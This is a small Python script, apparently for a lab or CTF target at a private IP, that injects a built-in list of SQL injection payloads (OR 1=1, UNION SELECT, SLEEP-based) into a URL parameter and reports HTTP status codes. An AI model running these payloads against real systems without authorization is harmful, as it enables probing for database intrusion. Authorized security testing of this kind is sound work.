#!/usr/bin/env python3
"""Quick SQLi status checker.

Usage examples:
  python short_sqli.py --target http://10.81.138.158/search.html --param q
  python short_sqli.py --target http://10.81.138.158/search.html --param q --method GET
"""

from __future__ import annotations

import argparse
import sys
import urllib.error
import urllib.parse
import urllib.request


DEFAULT_PAYLOADS = [
	"test",
	"test' OR 1=1--",
	"test' OR '1'='1'--",
	"test' UNION SELECT 1--",
	"test' AND 1=2--",
	"test' OR SLEEP(5)--",
]


def build_url(base_url: str, param: str, payload: str) -> str:
	parsed = urllib.parse.urlsplit(base_url)
	query_items = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)

	# Replace existing param if present, otherwise append it.
	replaced = False
	for i, (k, _v) in enumerate(query_items):
		if k == param:
			query_items[i] = (param, payload)
			replaced = True
	if not replaced:
		query_items.append((param, payload))

	new_query = urllib.parse.urlencode(query_items, doseq=True)
	return urllib.parse.urlunsplit((parsed.scheme, parsed.netloc, parsed.path, new_query, parsed.fragment))


def check_status(url: str, method: str, timeout: float) -> tuple[int, str, str]:
	req = urllib.request.Request(url, method=method)
	try:
		with urllib.request.urlopen(req, timeout=timeout) as response:
			status = response.getcode()
			server = response.headers.get("Server", "-")
			location = response.headers.get("Location", "-")
			return status, server, location
	except urllib.error.HTTPError as exc:
		server = exc.headers.get("Server", "-") if exc.headers else "-"
		location = exc.headers.get("Location", "-") if exc.headers else "-"
		return exc.code, server, location
	except urllib.error.URLError as exc:
		raise RuntimeError(f"Network error for {url}: {exc.reason}") from exc


def main() -> int:
	parser = argparse.ArgumentParser(description="Check HTTP status codes for SQLi-like payloads.")
	parser.add_argument(
		"--target",
		default="http://10.81.138.158/search.html",
		help="Base URL (default: http://10.81.138.158/search.html)",
	)
	parser.add_argument("--param", default="q", help="Query parameter to inject (default: q)")
	parser.add_argument("--method", choices=["HEAD", "GET"], default="HEAD", help="HTTP method (default: HEAD)")
	parser.add_argument("--timeout", type=float, default=8.0, help="Request timeout in seconds (default: 8)")
	parser.add_argument(
		"--payload",
		action="append",
		dest="payloads",
		help="Custom payload, can be used multiple times. If omitted, built-in set is used.",
	)
	args = parser.parse_args()

	payloads = args.payloads if args.payloads else DEFAULT_PAYLOADS

	print(f"Target : {args.target}")
	print(f"Param  : {args.param}")
	print(f"Method : {args.method}")
	print("-" * 90)
	print(f"{'Status':<8} {'Server':<24} {'Payload':<30} URL")
	print("-" * 90)

	for payload in payloads:
		url = build_url(args.target, args.param, payload)
		try:
			status, server, _location = check_status(url, args.method, args.timeout)
			print(f"{status:<8} {server[:24]:<24} {payload[:30]:<30} {url}")
		except RuntimeError as exc:
			print(f"ERROR    {'-':<24} {payload[:30]:<30} {exc}")

	print("-" * 90)
	return 0


if __name__ == "__main__":
	sys.exit(main())
